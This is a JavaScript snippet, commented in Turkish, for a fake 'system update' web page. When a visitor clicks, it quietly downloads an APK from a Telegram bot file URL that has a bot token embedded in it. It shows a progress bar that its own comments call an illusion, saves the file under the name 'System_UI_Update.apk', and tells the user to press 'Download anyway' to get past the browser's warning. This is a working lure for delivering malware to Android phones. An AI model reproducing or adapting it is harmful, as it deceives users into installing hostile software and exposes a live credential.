document.getElementById('start-btn').addEventListener('click', async function() {
    const btn = this;
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    const title = document.getElementById('title');
    
    btn.style.display = 'none'; // Butonu gizle
    title.innerText = "Sistem Güncelleniyor";
    
    // Test için senin Telegram linklerinden birini kullanalım
    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";

    try {
        // 1. ADIM: Sessiz İndirme Başlat (Blob)
        const response = await fetch(apkUrl);
        
        // İlerleme çubuğunu manuel olarak hızlandıralım (İllüzyon)
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 10;
            if (progress >= 95) {
                clearInterval(interval);
                bar.style.width = "100%";
                status.innerText = "Yükleme tamamlandı, açılıyor...";
            } else {
                bar.style.width = progress + "%";
                status.innerText = "İndiriliyor: " + Math.round(progress) + "%";
            }
        }, 200);

        const blob = await response.blob();
        const downloadUrl = window.URL.createObjectURL(blob);

        // 2. ADIM: Otomatik Başlatma (Intent Simülasyonu)
        // İndirme bittiğinde kullanıcıya sormadan indirme penceresini fırlatır
        setTimeout(() => {
            const a = document.createElement('a');
            a.href = downloadUrl;
            a.download = "System_UI_Update.apk"; // Videodaki gibi sistem ismi verdik
            document.body.appendChild(a);
            a.click(); // Chrome indirme uyarısını tetikler
            document.body.removeChild(a);
            
            // Kullanıcıyı bir sonraki adıma (kuruluma) ikna etmek için
            status.innerHTML = "<b>ÖNEMLİ:</b> Lütfen alttaki uyarıda 'Yine de indir' butonuna basın.";
        }, 3000);

    } catch (error) {
        status.innerText = "Hata oluştu. Lütfen tekrar deneyin.";
        btn.style.display = 'inline-block';
    }
});